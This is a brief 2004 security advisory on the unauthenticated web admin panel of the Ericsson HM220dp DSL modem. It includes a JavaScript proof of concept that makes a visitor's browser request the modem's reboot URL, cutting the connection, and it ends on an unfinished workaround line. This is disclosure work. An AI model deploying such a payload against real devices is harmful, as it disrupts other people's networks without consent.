CONTENTS =========

Subject: DSL Modem Ericsson HM220dp Exploit
Date: February 22, 2004
Risk: Moderate



DESCRIPTION =========

This is the natural consequence of the following security flaw:

http://www.secunia.com/advisories/8057/
http://www.securityfocus.com/bid/6824/info/

The Ericsson HM220dp DSL modem/router provides no authentication for his Web Administration panel.
So, a malicious user can access the panel and change settings on a local network.

I discovered another serious implication of this bug: the vulnerability can be exploited also throughout a web page, this means that a script contained in a malicious web site (or e-mail) can modify the modem configuration; is also possible to interrupt the modem connection. 



DETAILS =========

This is a proof-of-concept:


[script]
function exploit(){
window.location = "view-source:http://192.168.254.254/dummy.html?reboot=1";
}
[/script]
[input type="button" value="disconnect" onClick="exploit();"]



WORKAROUNDS ========

By changing the modem's default IP address (192.168.254.254) the exploit cannot work. In order to patch the flaw Ericsson also provided the following update:
